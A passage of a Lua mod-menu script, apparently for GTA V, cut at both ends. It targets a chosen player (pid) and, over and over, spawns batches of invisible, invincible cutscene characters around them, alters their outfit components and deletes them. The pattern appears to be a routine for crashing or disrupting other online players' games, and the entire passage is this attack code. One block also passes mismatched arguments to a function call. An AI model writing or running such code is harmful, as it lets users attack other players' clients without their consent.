                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds1[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds1[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds1[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds1[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lazlow")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds2 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds2[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds2[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds2[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds2[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds2[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds2[i], 3, 0, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds2[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_taocheng")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds3 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds3[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds3[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds3[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds3[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds3[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds3[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds3[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_solomon")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds4 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds4[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds4[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds4[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds4[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds4[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds4[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds4[i])
                    util.yield(5)
                end
                util.yield(5)
                local pedhash = util.joaat("cs_stevehains")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds5 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds5[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds5[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds5[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds5[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds5[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds5[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds5[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_taostranslator")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds6 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds6[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds6[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds6[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds6[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds6[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds6[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds6[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_debra")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds7 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds7[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds7[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds7[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds7[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds7[i], 4, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds7[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_devin")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds8 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds8[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds8[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds8[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds8[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds8[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds8[i], 3, 1, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds8[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_guadalope")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds9 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds9[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds9[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds9[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds9[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds9[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds9[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds9[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_gurk")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds10 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds10[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds10[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds10[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds10[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds10[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds10[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds10[i])
                    util.yield(5)
                end
                
                local pedhash = util.joaat("cs_jimmydisanto")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds11 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds11[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds11[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds11[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds11[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds11[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds11[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds11[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_josh")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds12 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds12[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds12[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds12[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds12[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds12[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds12[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds12[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lamardavis")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds13 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds13[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds13[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds13[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds13[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds13[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds13[i], 3, 2, 3, 0 )
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds13[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds14 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds14[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds14[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds14[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds14[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds14[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds14[i], 11, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds14[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_lestercrest_3")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds15 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds15[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds15[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds15[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds15[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds15[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds15[i], 3, 2, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds15[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_martinmadrazo")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds16 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
